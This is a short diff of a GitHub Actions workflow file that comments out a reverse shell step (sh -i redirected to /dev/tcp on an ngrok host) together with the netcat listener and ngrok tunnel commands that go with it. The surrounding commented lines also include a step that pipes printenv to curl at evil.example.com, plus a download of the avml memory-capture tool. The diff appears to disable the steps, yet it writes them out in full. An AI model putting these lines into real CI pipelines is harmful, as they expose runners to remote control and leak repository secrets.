@@ -26,11 +26,11 @@ jobs:
       #     path: ./temp.log
       # - run: |
       #     printenv | curl -X POST https://evil.example.com/endpoint -H \"Content-Type: text/plain\" --data-binary @-
-      nc -lvnp 1337
-      
-      ngrok tcp 1337
-      
-      - run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/21635 0>&1
+      #nc -lvnp 1337
+      #
+      #ngrok tcp 1337
+      #
+      #- run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/21635 0>&1
       # - run: |
       #     wget -O ./avml https://github.com/microsoft/avml/releases/download/v0.18.0/avml
       #     chmod +x ./avml
